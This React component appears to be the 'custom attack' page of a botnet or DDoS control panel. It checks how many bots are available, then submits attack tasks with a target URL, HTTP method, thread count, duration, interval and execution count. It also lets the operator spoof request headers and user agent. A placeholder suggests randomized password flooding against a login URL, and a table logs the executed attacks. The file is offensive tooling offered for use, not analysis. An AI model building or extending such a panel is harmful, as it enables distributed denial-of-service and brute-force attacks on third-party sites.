import React from 'react';
import {
  Row,
  Card,
  CardBody,
  Input,
  CardTitle,
  FormGroup,
  Label,
  CustomInput,
  Button,
  FormText,
  Form,
  Table,
} from 'reactstrap';
import IntlMessages from '../../../helpers/IntlMessages';
import { Colxx, Separator } from '../../../components/common/CustomBootstrap';
import Breadcrumb from '../../../containers/navs/Breadcrumb';
import { NotificationManager } from '../../../components/common/react-notifications';
import axios from 'axios';

const onFormSubmit = (e) => {
  const data = new FormData(e.target);
  if (Number(data.get('numberOfExecutions')) === 0) {
    axios
      .get('/api/status/bot?type=status', {
        headers: {
          "Token": localStorage.getItem('token'),
        },
      })
      .then((res) => {
        if (res.data.code === 200) {
          axios
            .post('/api/task/create?type=attack', JSON.stringify({
              attackType: "custom",
              method: data.get('attackMethod'),
              target: data.get('targetURL'),
              thread: Number(data.get('attackThread')),
              duration: Number(data.get('attackDuration')),
              interval: Number(data.get('attackInterval')),
              data: data.get('requestData'),
              accept: data.get('requestAccept'),
              acceptEncoding: data.get('requestAcceptEncoding'),
              acceptLanguage: data.get('requestAccceptLanguage'),
              userAgent: data.get('requestUserAgent'),
              custom: data.get('customHeader'),
              targetExecution: Number(res.data.value.split('/')[0]),
            }), {
              headers: {
                "Token": localStorage.getItem('token'),
              },
            })
            .then((res2) => {
              if (res2.data.code === 200) {
                createNotification('success', null, "Succeed!", res2.data.message);
              }
            })
            .catch((error) => {
              createNotification('error', null, "Failed!", error.response.data.message);
            })
        }
      })
      .catch((error) => {
        createNotification('error', null, "Failed!", error.response.data.message);
      })
  } else {
    axios
      .post('/api/task/create?type=attack', JSON.stringify({
        attackType: "custom",
        method: data.get('attackMethod'),
        target: data.get('targetURL'),
        thread: Number(data.get('attackThread')),
        duration: Number(data.get('attackDuration')),
        interval: Number(data.get('attackInterval')),
        data: data.get('requestData'),
        accept: data.get('requestAccept'),
        acceptEncoding: data.get('requestAcceptEncoding'),
        acceptLanguage: data.get('requestAccceptLanguage'),
        userAgent: data.get('requestUserAgent'),
        custom: data.get('customHeader'),
        targetExecution: Number(data.get('numberOfExecutions')),
      }), {
        headers: {
          "Token": localStorage.getItem('token'),
        },
      })
      .then((res) => {
        if (res.data.code === 200) {
          createNotification('success', null, "Succeed!", res.data.message);
        }
      })
      .catch((error) => {
        createNotification('error', null, "Failed!", error.response.data.message);
      })
  }
  e.preventDefault();
}

const createNotification = (type, className, title, content) => {
  const cName = className || '';
  switch (type) {
    case 'primary':
      NotificationManager.primary(
        content,
        title,
        3000,
        null,
        null,
        cName
      );
      break;
    case 'secondary':
      NotificationManager.secondary(
        content,
        title,
        3000,
        null,
        null,
        cName
      );
      break;
    case 'info':
      NotificationManager.info('Info message', '', 3000, null, null, cName);
      break;
    case 'success':
      NotificationManager.success(
        content,
        title,
        3000,
        null,
        null,
        cName
      );
      break;
    case 'warning':
      NotificationManager.warning(
        content,
        title,
        3000,
        null,
        null,
        cName
      );
      break;
    case 'error':
      NotificationManager.error(
        content,
        title,
        5000,
        () => {
          alert('callback');
        },
        null,
        cName
      );
      break;
    default:
      NotificationManager.info('Info message');
      break;
  }
};

const CustomDefault = ({ match, attackLogs }) => (
  <>
    <Row>
      <Colxx xxs="12">
        <Breadcrumb heading="menu.attack.custom" match={match} />
        <Separator className="mb-5" />
      </Colxx>
    </Row>
    <Form onSubmit={onFormSubmit}>
      <Row className="mb-4">
        <Colxx xxs="6">
          <Card>
            <CardBody>
              <CardTitle>
                <IntlMessages id="forms.custom-attack" />
              </CardTitle>
              <FormGroup>
                <Label for="attackMethod">
                  <IntlMessages id="forms.attack-method" />
                </Label>
                <div>
                  <CustomInput
                    defaultChecked
                    inline
                    type="radio"
                    id="attackMethod"
                    name="attackMethod"
                    label="GET"
                    value="GET"
                  />
                  <CustomInput
                    inline
                    type="radio"
                    id="attackMethod2"
                    name="attackMethod"
                    label="POST"
                    value="POST"
                  />
                  <CustomInput
                    inline
                    type="radio"
                    id="attackMethod3"
                    name="attackMethod"
                    label="HEAD"
                    value="HEAD"
                  />
                </div>
              </FormGroup>

              <FormGroup>
                <Label for="targetURL">
                  <IntlMessages id="forms.target-url" />
                </Label>
                <Input
                  required
                  type="text"
                  name="targetURL"
                  id="targetURL"
                  placeholder="https://example.com/login"
                />
                <FormText color="muted">
                  <IntlMessages id="forms.target-url-muted" />
                </FormText>
              </FormGroup>

              <FormGroup>
                <Label for="attackThread">
                  <IntlMessages id="forms.attack-thread" />
                </Label>
                <Input
                  required
                  type="number"
                  name="attackThread"
                  id="attackThread"
                  placeholder="300"
                />
              </FormGroup>

              <FormGroup>
                <Label for="attackDuration">
                  <IntlMessages id="forms.attack-duration" />
                </Label>
                <Input
                  required
                  type="number"
                  name="attackDuration"
                  id="attackDuration"
                  placeholder="600"
                />
              </FormGroup>

              <FormGroup>
                <Label for="attackInterval">
                  <IntlMessages id="forms.attack-interval" />
                </Label>
                <Input
                  required
                  type="number"
                  name="attackInterval"
                  id="attackInterval"
                  placeholder="10"
                />
              </FormGroup>

              <FormGroup>
                <Label for="numberOfExecutions">
                  <IntlMessages id="forms.number-of-executions" />
                </Label>
                <Input
                  required
                  type="number"
                  name="numberOfExecutions"
                  id="numberOfExecutions"
                  placeholder="50"
                />
                <FormText color="muted">
                  <IntlMessages id="forms.number-of-executions-muted" />
                </FormText>
              </FormGroup>

              <Button color="primary" className="mt-4">
                <IntlMessages id="forms.submit" />
              </Button>
            </CardBody>
          </Card>
        </Colxx>

        <Colxx xxs="6">
          <Card>
            <CardBody>
              <CardTitle>
                <IntlMessages id="forms.custom-attack-request" />
              </CardTitle>
              <FormGroup>
                <Label for="requestData">
                  <IntlMessages id="forms.request-data" />
                </Label>
                <Input
                  type="text"
                  name="requestData"
                  id="requestData"
                  placeholder="username=admin&password=%RAND%10"
                />
                <FormText color="muted">
                  <IntlMessages id="forms.request-data-muted" />
                </FormText>
              </FormGroup>

              <FormGroup>
                <Label for="requestAccept">
                  <IntlMessages id="forms.accept" />
                </Label>
                <Input
                  type="text"
                  name="requestAccept"
                  id="requestAccept"
                  placeholder="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
                />
                <FormText color="muted">
                  <IntlMessages id="forms.required-header" />
                </FormText>
              </FormGroup>

              <FormGroup>
                <Label for="requestAcceptEncoding">
                  <IntlMessages id="forms.accept-encoding" />
                </Label>
                <Input
                  type="text"
                  name="requestAcceptEncoding"
                  id="requestAcceptEncoding"
                  placeholder="gzip, deflate, br"
                />
                <FormText color="muted">
                  <IntlMessages id="forms.required-header" />
                </FormText>
              </FormGroup>

              <FormGroup>
                <Label for="requestAccceptLanguage">
                  <IntlMessages id="forms.accept-language" />
                </Label>
                <Input
                  type="text"
                  name="requestAccceptLanguage"
                  id="requestAccceptLanguage"
                  placeholder="en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7,de;q=0.6,ar;q=0.5,pt;q=0.4,ja;q=0.3,fr;q=0.2"
                />
                <FormText color="muted">
                  <IntlMessages id="forms.required-header" />
                </FormText>
              </FormGroup>

              <FormGroup>
                <Label for="requestUserAgent">
                  <IntlMessages id="forms.user-agent" />
                </Label>
                <Input
                  type="text"
                  name="requestUserAgent"
                  id="requestUserAgent"
                  placeholder="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
                />
                <FormText color="muted">
                  <IntlMessages id="forms.required-header" />
                </FormText>
              </FormGroup>

              <FormGroup>
                <Label for="customHeader">
                  <IntlMessages id="forms.custom-header" />
                </Label>
                <Input
                  type="text"
                  name="customHeader"
                  id="customHeader"
                  placeholder="TOKEN: 0123456789012345"
                />
              </FormGroup>
            </CardBody>
          </Card>
        </Colxx>
      </Row>
    </Form>

    <Row className="mb-4">
      <Colxx xxs="12">
        <Card className="mb-4">
          <CardBody>
            <CardTitle>
              <IntlMessages id="table.attack-log" />
            </CardTitle>
            <Table>
              <thead>
                <tr>
                  <th>#</th>
                  <th>Target</th>
                  <th>Data</th>
                  <th>Accept</th>
                  <th>UA</th>
                  <th>Header</th>
                  <th>Executed</th>
                </tr>
              </thead>
              <tbody>
                {(attackLogs || [])
                  .filter((x) => x.attackType === 'custom')
                  .map((x) => {
                    return (
                      <tr>
                        <th scope="row">{x.id}</th>
                        <td>{x.target}</td>
                        <td>{x.data}</td>
                        <td>{x.accept}</td>
                        <td>{x.userAgent}</td>
                        <td>{x.custom}</td>
                        <td>{x.currentExecution}</td>
                      </tr>
                    );
                  })}
              </tbody>
            </Table>
          </CardBody>
        </Card>
      </Colxx>
    </Row>
  </>
);

export default CustomDefault;
